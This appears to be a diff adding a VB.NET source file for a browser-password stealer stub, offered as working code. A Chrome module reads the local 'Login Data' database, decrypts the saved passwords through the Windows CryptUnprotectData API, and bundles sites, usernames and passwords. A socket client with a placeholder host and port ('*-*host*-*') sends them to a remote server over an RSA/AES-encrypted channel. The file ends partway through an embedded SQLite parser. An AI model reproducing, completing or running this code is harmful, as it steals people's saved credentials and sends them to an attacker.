@@ -1,0 +1,1183 @@
+﻿Imports System.Runtime.InteropServices
+Imports System.Collections.Generic
+Imports System.Net.Sockets
+Imports System.Net
+Imports System.ComponentModel
+Imports System.IO
+Imports System.Text
+Imports System.Security.Cryptography
+
+'------------------
+'Creator: aeonhack
+'Site: nimoru.com
+'Name: Buffered Client
+'Created: 9/12/2012
+'Changed: 6/13/2013
+'Version: 1.2.0.3
+'------------------
+
+NotInheritable Class UserClient
+    Implements System.IDisposable
+
+    'TODO: Lock objects where needed.
+    'TODO: Create and handle ReadQueue?
+    'TODO: Provide option to disable buffering.
+
+#Region " Events "
+
+    Public Event ExceptionThrown As ExceptionThrownEventHandler
+    Public Delegate Sub ExceptionThrownEventHandler(sender As UserClient, ex As System.Exception)
+
+    Private Sub OnExceptionThrown(ex As System.Exception)
+        RaiseEvent ExceptionThrown(Me, ex)
+    End Sub
+
+    Public Event StateChanged As StateChangedEventHandler
+    Public Delegate Sub StateChangedEventHandler(sender As UserClient, connected As Boolean)
+
+    Private Sub OnStateChanged(connected As Boolean)
+        RaiseEvent StateChanged(Me, connected)
+    End Sub
+
+    Public Event ReadPacket As ReadPacketEventHandler
+    Public Delegate Sub ReadPacketEventHandler(sender As UserClient, data As Byte())
+
+    Private Sub OnReadPacket(data As Byte())
+        RaiseEvent ReadPacket(Me, data)
+    End Sub
+
+    Public Event ReadProgressChanged As ReadProgressChangedEventHandler
+    Public Delegate Sub ReadProgressChangedEventHandler(sender As UserClient, progress As Double, bytesRead As Integer, bytesToRead As Integer)
+
+    Private Sub OnReadProgressChanged(progress As Double, bytesRead As Integer, bytesToRead As Integer)
+        RaiseEvent ReadProgressChanged(Me, progress, bytesRead, bytesToRead)
+    End Sub
+
+    Public Event WritePacket As WritePacketEventHandler
+    Public Delegate Sub WritePacketEventHandler(sender As UserClient, size As Integer)
+
+    Private Sub OnWritePacket(size As Integer)
+        RaiseEvent WritePacket(Me, size)
+    End Sub
+
+    Public Event WriteProgressChanged As WriteProgressChangedEventHandler
+    Public Delegate Sub WriteProgressChangedEventHandler(sender As UserClient, progress As Double, bytesWritten As Integer, bytesToWrite As Integer)
+
+    Private Sub OnWriteProgressChanged(progress As Double, bytesWritten As Integer, bytesToWrite As Integer)
+        RaiseEvent WriteProgressChanged(Me, progress, bytesWritten, bytesToWrite)
+    End Sub
+
+#End Region
+
+#Region " Properties "
+
+    Private _BufferSize As UShort = 8192
+    Public Property BufferSize() As UShort
+        Get
+            Return _BufferSize
+        End Get
+        Set(value As UShort)
+            If value < 1 Then
+                Throw New System.Exception("Value must be greater than 0.")
+            Else
+                _BufferSize = value
+            End If
+        End Set
+    End Property
+
+    Private _MaxPacketSize As Integer = 10485760
+    Public Property MaxPacketSize() As Integer
+        Get
+            Return _MaxPacketSize
+        End Get
+        Set(value As Integer)
+            If value < 1 Then
+                Throw New System.Exception("Value must be greater than 0.")
+            Else
+                _MaxPacketSize = value
+            End If
+        End Set
+    End Property
+
+    Private _KeepAlive As Boolean = True
+    Public Property KeepAlive() As Boolean
+        Get
+            Return _KeepAlive
+        End Get
+        Set(value As Boolean)
+            If _Connected Then
+                Throw New System.Exception("Unable to change this option while connected.")
+            Else
+                _KeepAlive = value
+            End If
+        End Set
+    End Property
+
+    Private _UserState As Object
+    Public Property UserState() As Object
+        Get
+            Return _UserState
+        End Get
+        Set(value As Object)
+            _UserState = value
+        End Set
+    End Property
+
+    Private _EndPoint As System.Net.IPEndPoint
+    Public ReadOnly Property EndPoint() As System.Net.IPEndPoint
+        Get
+            If _EndPoint IsNot Nothing Then
+                Return _EndPoint
+            Else
+                Return New System.Net.IPEndPoint(System.Net.IPAddress.None, 0)
+            End If
+        End Get
+    End Property
+
+    Private _Connected As Boolean
+    Public ReadOnly Property Connected() As Boolean
+        Get
+            Return _Connected
+        End Get
+    End Property
+
+#End Region
+
+    Private O As System.ComponentModel.AsyncOperation
+    Private Handle As System.Net.Sockets.Socket
+
+    Private SendIndex As Integer
+    Private SendBuffer As Byte()
+
+    Private ReadIndex As Integer
+    Private ReadBuffer As Byte()
+
+    Private SendQueue As System.Collections.Generic.Queue(Of Byte())
+
+    Private Items As System.Net.Sockets.SocketAsyncEventArgs()
+    Private Processing As Boolean() = New Boolean(1) {}
+
+    Public Sub New()
+        O = System.ComponentModel.AsyncOperationManager.CreateOperation(Nothing)
+    End Sub
+
+    Public Sub Connect(host As String, port As UShort)
+        Try
+            Disconnect()
+            Initialize()
+
+            Dim IP As System.Net.IPAddress = System.Net.IPAddress.None
+            If System.Net.IPAddress.TryParse(host, IP) Then
+                DoConnect(IP, port)
+            Else
+                System.Net.Dns.BeginGetHostEntry(host, AddressOf EndGetHostEntry, port)
+            End If
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Private Sub EndGetHostEntry(r As System.IAsyncResult)
+        Try
+            DoConnect(System.Net.Dns.EndGetHostEntry(r).AddressList(0), DirectCast(r.AsyncState, UShort))
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Private Sub DoConnect(ip As System.Net.IPAddress, port As UShort)
+        Try
+            Handle = New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)
+            Handle.NoDelay = True
+
+            If _KeepAlive Then
+                Handle.SetSocketOption(System.Net.Sockets.SocketOptionLevel.Socket, System.Net.Sockets.SocketOptionName.KeepAlive, 20000)
+            End If
+
+            Items(0).RemoteEndPoint = New System.Net.IPEndPoint(ip, port)
+            If Not Handle.ConnectAsync(Items(0)) Then
+                Process(Nothing, Items(0))
+            End If
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Private Sub Initialize()
+        Processing = New Boolean(1) {}
+
+        SendIndex = 0
+        ReadIndex = 0
+
+        SendBuffer = New Byte(-1) {}
+        ReadBuffer = New Byte(-1) {}
+
+        SendQueue = New System.Collections.Generic.Queue(Of Byte())()
+
+        Items = New System.Net.Sockets.SocketAsyncEventArgs(1) {}
+
+        Items(0) = New System.Net.Sockets.SocketAsyncEventArgs()
+        Items(1) = New System.Net.Sockets.SocketAsyncEventArgs()
+        AddHandler Items(0).Completed, AddressOf Process
+        AddHandler Items(1).Completed, AddressOf Process
+    End Sub
+
+    Private Sub Process(s As Object, e As System.Net.Sockets.SocketAsyncEventArgs)
+        Try
+            If e.SocketError = System.Net.Sockets.SocketError.Success Then
+                Select Case e.LastOperation
+                    Case System.Net.Sockets.SocketAsyncOperation.Connect
+                        _EndPoint = DirectCast(Handle.RemoteEndPoint, System.Net.IPEndPoint)
+                        _Connected = True
+                        Items(0).SetBuffer(New Byte(_BufferSize - 1) {}, 0, _BufferSize)
+
+                        OnStateChanged(True)
+                        If Not Handle.ReceiveAsync(e) Then
+                            Process(Nothing, e)
+                        End If
+                    Case System.Net.Sockets.SocketAsyncOperation.Receive
+                        If Not _Connected Then Return
+
+                        If Not e.BytesTransferred = 0 Then
+                            HandleRead(e.Buffer, 0, e.BytesTransferred)
+
+                            If Not Handle.ReceiveAsync(e) Then
+                                Process(Nothing, e)
+                            End If
+                        Else
+                            Disconnect()
+                        End If
+                    Case System.Net.Sockets.SocketAsyncOperation.Send
+                        If Not _Connected Then Return
+
+                        Dim EOS As Boolean
+                        SendIndex += e.BytesTransferred
+
+                        O.Post(AddressOf WriteProgressChangedCallback, New Object() {(SendIndex / SendBuffer.Length) * 100, SendIndex, SendBuffer.Length})
+
+                        If (SendIndex >= SendBuffer.Length) Then
+                            EOS = True
+                            OnWritePacket(SendBuffer.Length - 4)
+                        End If
+
+                        If SendQueue.Count = 0 AndAlso EOS Then
+                            Processing(1) = False
+                        Else
+                            HandleSendQueue()
+                        End If
+                End Select
+            Else
+                OnExceptionThrown(New System.Net.Sockets.SocketException(e.SocketError))
+                Disconnect()
+            End If
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Public Sub Disconnect()
+        On Error Resume Next
+        If Processing(0) Then
+            Return
+        Else
+            Processing(0) = True
+        End If
+
+        Dim Raise As Boolean = _Connected
+        _Connected = False
+
+        If Handle IsNot Nothing Then
+            Handle.Close()
+        End If
+
+        If SendQueue IsNot Nothing Then
+            SendQueue.Clear()
+        End If
+
+        SendBuffer = New Byte(-1) {}
+        ReadBuffer = New Byte(-1) {}
+
+        If Raise Then
+            OnStateChanged(False)
+        End If
+
+        If Items IsNot Nothing Then
+            Items(0).Dispose()
+            Items(1).Dispose()
+        End If
+
+        _UserState = Nothing
+        _EndPoint = Nothing
+    End Sub
+
+    Public Sub Send(data As Byte())
+        If Not _Connected Then Return
+
+        SendQueue.Enqueue(data)
+
+        If Not Processing(1) Then
+            Processing(1) = True
+            HandleSendQueue()
+        End If
+    End Sub
+
+    Private Sub HandleSendQueue()
+        Try
+            If SendIndex >= SendBuffer.Length Then
+                SendIndex = 0
+                SendBuffer = Header(SendQueue.Dequeue())
+            End If
+
+            Dim Write As Integer = System.Math.Min(SendBuffer.Length - SendIndex, _BufferSize)
+            Items(1).SetBuffer(SendBuffer, SendIndex, Write)
+
+            If Not Handle.SendAsync(Items(1)) Then
+                Process(Nothing, Items(1))
+            End If
+        Catch ex As System.Exception
+            OnExceptionThrown(ex)
+            Disconnect()
+        End Try
+    End Sub
+
+    Private Shared Function Header(data As Byte()) As Byte()
+        Dim T As Byte() = New Byte(data.Length + 3) {}
+        System.Buffer.BlockCopy(System.BitConverter.GetBytes(data.Length), 0, T, 0, 4)
+        System.Buffer.BlockCopy(data, 0, T, 4, data.Length)
+        Return T
+    End Function
+
+    Private Sub HandleRead(data As Byte(), index As Integer, length As Integer)
+        If ReadIndex >= ReadBuffer.Length Then
+            ReadIndex = 0
+            If data.Length < 4 Then
+                OnExceptionThrown(New System.Exception("Missing or corrupt packet header."))
+                Disconnect()
+                Return
+            End If
+
+            Dim PacketSize As Integer = System.BitConverter.ToInt32(data, index)
+            If PacketSize > _MaxPacketSize Then
+                OnExceptionThrown(New System.Exception("Packet size exceeds MaxPacketSize."))
+                Disconnect()
+                Return
+            End If
+
+            System.Array.Resize(ReadBuffer, PacketSize)
+            index += 4
+        End If
+
+        Dim Read As Integer = System.Math.Min(ReadBuffer.Length - ReadIndex, length - index)
+        System.Buffer.BlockCopy(data, index, ReadBuffer, ReadIndex, Read)
+        ReadIndex += Read
+
+        O.Post(AddressOf ReadProgressChangedCallback, New Object() {(ReadIndex / ReadBuffer.Length) * 100, ReadIndex, ReadBuffer.Length})
+
+        If ReadIndex >= ReadBuffer.Length Then
+            Dim BufferClone(ReadBuffer.Length - 1) As Byte 'Race condition fail-safe.
+            System.Buffer.BlockCopy(ReadBuffer, 0, BufferClone, 0, ReadBuffer.Length)
+
+            OnReadPacket(BufferClone)
+        End If
+
+        If Read < (length - index) Then
+            HandleRead(data, index + Read, length)
+        End If
+    End Sub
+
+    Private Sub ReadProgressChangedCallback(arg As Object)
+        Dim Params As Object() = DirectCast(arg, Object())
+        OnReadProgressChanged(DirectCast(Params(0), Double), DirectCast(Params(1), Integer), DirectCast(Params(2), Integer))
+    End Sub
+
+    Private Sub WriteProgressChangedCallback(arg As Object)
+        Dim Params As Object() = DirectCast(arg, Object())
+        OnWriteProgressChanged(DirectCast(Params(0), Double), DirectCast(Params(1), Integer), DirectCast(Params(2), Integer))
+    End Sub
+
+#Region " IDisposable Support "
+
+    Private DisposedValue As Boolean
+
+    Private Sub Dispose(disposing As Boolean)
+        If Not DisposedValue AndAlso disposing Then Disconnect()
+        DisposedValue = True
+    End Sub
+
+    Public Sub Dispose() Implements System.IDisposable.Dispose
+        Dispose(True)
+        System.GC.SuppressFinalize(Me)
+    End Sub
+
+#End Region
+
+End Class
+
+NotInheritable Class Pack
+
+    Private Table As System.Collections.Generic.Dictionary(Of System.Type, Byte)
+    Public Sub New()
+        Table = New System.Collections.Generic.Dictionary(Of System.Type, Byte)()
+
+        Table.Add(GetType(Boolean), 0)
+        Table.Add(GetType(Byte), 1)
+        Table.Add(GetType(Byte()), 2)
+        Table.Add(GetType(Char), 3)
+        Table.Add(GetType(Char()), 4)
+        Table.Add(GetType(Decimal), 5)
+        Table.Add(GetType(Double), 6)
+        Table.Add(GetType(Integer), 7)
+        Table.Add(GetType(Long), 8)
+        Table.Add(GetType(SByte), 9)
+        Table.Add(GetType(Short), 10)
+        Table.Add(GetType(Single), 11)
+        Table.Add(GetType(String), 12)
+        Table.Add(GetType(UInteger), 13)
+        Table.Add(GetType(ULong), 14)
+        Table.Add(GetType(UShort), 15)
+        Table.Add(GetType(System.DateTime), 16)
+    End Sub
+
+    Public Function Serialize(ParamArray data As Object()) As Byte()
+        Dim Stream As New System.IO.MemoryStream()
+        Dim Writer As New System.IO.BinaryWriter(Stream, System.Text.Encoding.UTF8)
+        Dim Current As Byte = 0
+
+        Writer.Write(System.Convert.ToByte(data.Length))
+
+        For I As Integer = 0 To data.Length - 1
+            Current = Table(data(I).GetType())
+            Writer.Write(Current)
+
+            Select Case Current
+                Case 0
+                    Writer.Write(DirectCast(data(I), Boolean))
+                Case 1
+                    Writer.Write(DirectCast(data(I), Byte))
+                Case 2
+                    Writer.Write(DirectCast(data(I), Byte()).Length)
+                    Writer.Write(DirectCast(data(I), Byte()))
+                Case 3
+                    Writer.Write(DirectCast(data(I), Char))
+                Case 4
+                    Writer.Write(DirectCast(data(I), Char()).ToString())
+                Case 5
+                    Writer.Write(DirectCast(data(I), Decimal))
+                Case 6
+                    Writer.Write(DirectCast(data(I), Double))
+                Case 7
+                    Writer.Write(DirectCast(data(I), Integer))
+                Case 8
+                    Writer.Write(DirectCast(data(I), Long))
+                Case 9
+                    Writer.Write(DirectCast(data(I), SByte))
+                Case 10
+                    Writer.Write(DirectCast(data(I), Short))
+                Case 11
+                    Writer.Write(DirectCast(data(I), Single))
+                Case 12
+                    Writer.Write(DirectCast(data(I), String))
+                Case 13
+                    Writer.Write(DirectCast(data(I), UInteger))
+                Case 14
+                    Writer.Write(DirectCast(data(I), ULong))
+                Case 15
+                    Writer.Write(DirectCast(data(I), UShort))
+                Case 16
+                    Writer.Write(DirectCast(data(I), Date).ToBinary())
+            End Select
+        Next
+
+        Writer.Close()
+        Return Stream.ToArray()
+    End Function
+
+    Public Function Deserialize(data As Byte()) As Object()
+        Dim Stream As New System.IO.MemoryStream(data)
+        Dim Reader As New System.IO.BinaryReader(Stream, System.Text.Encoding.UTF8)
+        Dim Items As New System.Collections.Generic.List(Of Object)()
+        Dim Current As Byte = 0
+        Dim Count As Byte = Reader.ReadByte()
+
+        For I As Integer = 0 To Count - 1
+            Current = Reader.ReadByte()
+
+            Select Case Current
+                Case 0
+                    Items.Add(Reader.ReadBoolean())
+                Case 1
+                    Items.Add(Reader.ReadByte())
+                Case 2
+                    Items.Add(Reader.ReadBytes(Reader.ReadInt32()))
+                Case 3
+                    Items.Add(Reader.ReadChar())
+                Case 4
+                    Items.Add(Reader.ReadString().ToCharArray())
+                Case 5
+                    Items.Add(Reader.ReadDecimal())
+                Case 6
+                    Items.Add(Reader.ReadDouble())
+                Case 7
+                    Items.Add(Reader.ReadInt32())
+                Case 8
+                    Items.Add(Reader.ReadInt64())
+                Case 9
+                    Items.Add(Reader.ReadSByte())
+                Case 10
+                    Items.Add(Reader.ReadInt16())
+                Case 11
+                    Items.Add(Reader.ReadSingle())
+                Case 12
+                    Items.Add(Reader.ReadString())
+                Case 13
+                    Items.Add(Reader.ReadUInt32())
+                Case 14
+                    Items.Add(Reader.ReadUInt64())
+                Case 15
+                    Items.Add(Reader.ReadUInt16())
+                Case 16
+                    Items.Add(System.DateTime.FromBinary(Reader.ReadInt64()))
+            End Select
+        Next
+
+        Reader.Close()
+        Return Items.ToArray()
+    End Function
+End Class
+
+Class Client
+    Private Packer As New Pack
+    Private WithEvents c As New UserClient
+
+    Public SecureConnection As Boolean
+
+    Private encryptor As System.Security.Cryptography.ICryptoTransform
+    Private decryptor As System.Security.Cryptography.ICryptoTransform
+    Private endpointer As String = "*-*endpoint*-*"
+
+    Public Function encrypt(data As Byte()) As Byte()
+        Return encryptor.TransformFinalBlock(data, 0, data.Length)
+    End Function
+
+    Public Function decrypt(data As Byte()) As Byte()
+        Return decryptor.TransformFinalBlock(data, 0, data.Length)
+    End Function
+
+    Enum PacketHeader As Byte
+        Handshake = 0
+        Compile = 1
+        FunctionHandshake = 6
+        PW = 7
+    End Enum
+
+#Region " Helper Methods "
+    Private Sub SendPacket(ParamArray args As Object())
+        Dim data As Byte() = Packer.Serialize(args)
+        If SecureConnection Then
+            data = encrypt(data)
+        End If
+        c.Send(data)
+    End Sub
+#End Region
+
+#Region " Packet Senders "
+
+    Private Sub SendHandshakePacket(data As Byte())
+        SendPacket(CByte(PacketHeader.FunctionHandshake), CByte(PacketHeader.PW), data)
+    End Sub
+
+    Private Sub SendPWPacket(data As Byte())
+        SendPacket(CByte(PacketHeader.PW), data)
+    End Sub
+#End Region
+
+#Region " Packet Handlers "
+
+
+    Private Sub HandleHandshakePacket(values As Object())
+        Dim PublicKey As Byte() = DirectCast(values(1), Byte())
+
+        Dim RSA As New System.Security.Cryptography.RSACryptoServiceProvider(2048)
+        RSA.ImportCspBlob(PublicKey)
+
+        Dim r As New System.Security.Cryptography.RijndaelManaged()
+        encryptor = r.CreateEncryptor()
+        decryptor = r.CreateDecryptor()
+
+        Dim data As Byte() = Packer.Serialize(r.Key, r.IV)
+        data = RSA.Encrypt(data, True)
+
+        SendHandshakePacket(data)
+
+        SecureConnection = True
+    End Sub
+
+    Private Sub HandlePWPacket()
+        Dim data As Byte() = Packer.Serialize(endpointer, Chrome.GetChrome())
+        SendPWPacket(data)
+    End Sub
+
+#End Region
+    Sub Main()
+        c.Connect("*-*host*-*", *-*port*-*)
+    End Sub
+
+    Private Sub client_StateChanged(sender As UserClient, connected As Boolean) Handles c.StateChanged
+        If Not connected Then
+            SecureConnection = False
+        End If
+    End Sub
+
+    Private Sub client_ExceptionThrown(sender As UserClient, ex As System.Exception) Handles c.ExceptionThrown
+
+    End Sub
+
+    Private Sub client_ReadPacket(sender As UserClient, data() As Byte) Handles c.ReadPacket
+        If SecureConnection Then
+            data = decrypt(data)
+        End If
+
+        Dim values As Object() = Packer.Deserialize(data)
+        If values Is Nothing OrElse values.Length = 0 Then Return
+
+        Select Case DirectCast(values(0), PacketHeader)
+            Case PacketHeader.Handshake
+                HandleHandshakePacket(values)
+            Case PacketHeader.PW
+                HandlePWPacket()
+        End Select
+    End Sub
+
+    Private Sub client_ReadProgressChanged(sender As UserClient, progress As Double, bytesRead As Integer, bytesToRead As Integer) Handles c.ReadProgressChanged
+
+    End Sub
+
+    Private Sub client_WritePacket(sender As UserClient, size As Integer) Handles c.WritePacket
+
+    End Sub
+
+    Private Sub client_WriteProgressChanged(sender As UserClient, progress As Double, bytesWritten As Integer, bytesToWrite As Integer) Handles c.WriteProgressChanged
+
+    End Sub
+
+End Class
+
+
+
+Module Chrome
+
+    Public cPass As String
+    Public Function GetChrome() As String
+        Dim datapath As String = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
+        GetChrome = "NewBlock-.-.-.-========-.-.-.-Chrome-.-.-.-========"
+        Try
+            Dim SQLDatabase As SQLiteHandler = New SQLiteHandler(datapath)
+            SQLDatabase.ReadTable("logins")
+
+            If File.Exists(datapath) Then
+
+                Dim host, user, pass As String
+                Dim i As Integer
+                For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
+                    host = SQLDatabase.GetValue(i, "origin_url")
+                    user = SQLDatabase.GetValue(i, "username_value")
+                    pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))
+
+                    If Not host.Contains("paypal") Then
+                        If (user <> "") And (pass <> "") Then
+                            cPass = ("NewBlock-.-.-.-" & host & "-.-.-.-" & user & "-.-.-.-" & pass & "-.-.-.-")
+                            GetChrome += cPass
+                        End If
+                    End If
+                Next
+
+            End If
+            Return GetChrome
+        Catch e As System.Exception
+            If GetChrome = "" Then
+                Return "No Data Found"
+            Else
+                Return GetChrome
+            End If
+        End Try
+    End Function
+    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As System.IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
+    End Function
+    <System.Flags()> Enum CryptProtectPromptFlags
+        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
+        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
+    End Enum
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
+        Public cbSize As Integer
+        Public dwPromptFlags As CryptProtectPromptFlags
+        Public hwndApp As System.IntPtr
+        Public szPrompt As String
+    End Structure
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
+        Public cbData As Integer
+        Public pbData As System.IntPtr
+    End Structure
+    Function Decrypt(ByVal Datas() As Byte) As String
+        Dim inj, Ors As New DATA_BLOB
+        Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
+        inj.pbData = Ghandle.AddrOfPinnedObject()
+        inj.cbData = Datas.Length
+        Ghandle.Free()
+        CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
+        Dim Returned() As Byte = New Byte(Ors.cbData) {}
+        Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
+        Dim TheString As String = Encoding.Default.GetString(Returned)
+        Return TheString.Substring(0, TheString.Length - 1)
+    End Function
+
+End Module
+
+
+Public Class SQLiteHandler
+    Private db_bytes() As Byte
+    Private page_size As System.UInt16
+    Private encoding As System.UInt64
+    Private master_table_entries() As sqlite_master_entry
+
+    Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
+    Private table_entries() As table_entry
+    Private field_names() As String
+
+    Private Structure record_header_field
+        Dim size As System.Int64
+        Dim type As System.Int64
+    End Structure
+
+    Private Structure table_entry
+        Dim row_id As System.Int64
+        Dim content() As String
+    End Structure
+
+    Private Structure sqlite_master_entry
+        Dim row_id As System.Int64
+        Dim item_type As String
+        Dim item_name As String
+        Dim astable_name As String
+        Dim root_num As System.Int64
+        Dim sql_statement As String
+    End Structure
+
+    'Needs BigEndian
+    'GetVariableLength
+    ' returns the endindex of an variable length integer
+    Private Function GVL(ByVal startIndex As Integer) As Integer
+        If startIndex > db_bytes.Length Then Return Nothing
+        Dim i As Integer
+        For i = startIndex To startIndex + 8 Step 1
+            If i > db_bytes.Length - 1 Then
+                Return Nothing
+            ElseIf (db_bytes(i) And &H80) <> &H80 Then
+                Return i
+            End If
+        Next
+
+        Return startIndex + 8
+    End Function
+
+    ' Eingaberichtung BigEndian
+    ' ConvertVariableLength
+    Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As System.Int64
+        endIndex = endIndex + 1
+
+        Dim retus(7) As Byte
+        Dim Length As Integer = endIndex - startIndex
+        Dim Bit64 As Boolean = False
+
+        If Length = 0 Or Length > 9 Then Return Nothing
+        If Length = 1 Then
+            retus(0) = (db_bytes(startIndex) And &H7F)
+            Return System.BitConverter.ToInt64(retus, 0)
+        End If
+
+        If Length = 9 Then
+            ' Ein Byte wird n?mlich grad hinzugef?gt
+            Bit64 = True
+        End If
+
+        Dim j As Integer = 1
+        Dim k As Integer = 7
+        Dim y As Integer = 0
+
+        If Bit64 Then
+            retus(0) = db_bytes(endIndex - 1)
+            endIndex = endIndex - 1
+            y = 1
+        End If
+        Dim i As Integer
+        For i = (endIndex - 1) To startIndex Step -1
+            If (i - 1) >= startIndex Then
+                retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k)
+                j = j + 1
+                y = y + 1
+                k = k - 1
+            Else
+                If Not Bit64 Then retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j))
+            End If
+        Next
+
+        Return System.BitConverter.ToInt64(retus, 0)
+    End Function
+
+    'Checks if a number is odd
+    Private Function IsOdd(ByVal value As System.Int64) As Boolean
+        Return (value And 1) = 1
+    End Function
+
+    'Big Endian Conversation
+    Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As System.UInt64
+        If Size > 8 Or Size = 0 Then Return Nothing
+
+        Dim retVal As System.UInt64 = 0
+        Dim i As Integer
+        For i = 0 To Size - 1 Step 1
+            retVal = ((retVal << 8) Or db_bytes(startIndex + i))
+        Next
+
+        Return retVal
+    End Function
+
+    Private Sub ReadMasterTable(ByVal Offset As System.UInt64)
+
+        If db_bytes(Offset) = &HD Then 'Leaf node
+            'Length for setting the array length for the entries
+            Dim Length As System.UInt16 = ConvertToInteger(Offset + 3, 2) - 1
+            Dim ol As Integer = 0
+
+            If Not master_table_entries Is Nothing Then
+                ol = master_table_entries.Length
+                ReDim Preserve master_table_entries(master_table_entries.Length + Length)
+            Else
+                ReDim master_table_entries(Length)
+            End If
+
+            Dim ent_offset As System.UInt64
+            Dim i As Integer
+
+            For i = 0 To Length Step 1
+                ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)
+
+                If Offset <> 100 Then ent_offset = ent_offset + Offset
+
+                'Table Cell auslesen
+                Dim t As Integer = GVL(ent_offset)
+                Dim size As System.Int64 = CVL(ent_offset, t)
+
+                Dim s As Integer = GVL(ent_offset + (t - ent_offset) + 1)
+                master_table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)
+
+                'Table Content
+                'Resetting the offset
+                ent_offset = ent_offset + (s - ent_offset) + 1
+
+                'Now get to the Record Header
+                t = GVL(ent_offset)
+                s = t
+                Dim Rec_Header_Size As System.Int64 = CVL(ent_offset, t) 'Record Header Length
+
+                Dim Field_Size(4) As System.Int64
+
+                'Now get the field sizes and fill in the Values
+                Dim j As Integer
+
+                For j = 0 To 4 Step 1
+                    t = s + 1
+                    s = GVL(t)
+                    Field_Size(j) = CVL(t, s)
+
+                    If Field_Size(j) > 9 Then
+                        If IsOdd(Field_Size(j)) Then
+                            Field_Size(j) = (Field_Size(j) - 13) / 2
+                        Else
+                            Field_Size(j) = (Field_Size(j) - 12) / 2
+                        End If
+                    Else
+                        Field_Size(j) = SQLDataTypeSize(Field_Size(j))
+                    End If
+                Next
+
+                ' Wir lesen nur unbedingt notwendige Sachen aus
+                If encoding = 1 Then
+                    master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
+                ElseIf encoding = 2 Then
+                    master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
+                ElseIf encoding = 3 Then
+                    master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
+                End If
+                If encoding = 1 Then
+                    master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
+                ElseIf encoding = 2 Then
+                    master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
+                ElseIf encoding = 3 Then
+                    master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
+                End If
+                'master_table_entries(ol + i).astable_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1), Field_Size(2))
+                master_table_entries(ol + i).root_num = ConvertToInteger(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2), Field_Size(3))
+                If encoding = 1 Then
+                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
+                ElseIf encoding = 2 Then
+                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
+                ElseIf encoding = 3 Then
+                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
+                End If
+            Next
+        ElseIf db_bytes(Offset) = &H5 Then 'internal node
+            Dim Length As System.UInt16 = ConvertToInteger(Offset + 3, 2) - 1
+            Dim ent_offset As System.UInt16
+            Dim i As Integer
+
+            For i = 0 To Length Step 1
+                ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)
+
+                If Offset = 100 Then
+                    ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
+                Else
+                    ReadMasterTable((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
+                End If
+
+            Next
+
+            ReadMasterTable((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
+        End If
+    End Sub
+
+    Private Function ReadTableFromOffset(ByVal Offset As System.UInt64) As Boolean
+        If db_bytes(Offset) = &HD Then 'Leaf node
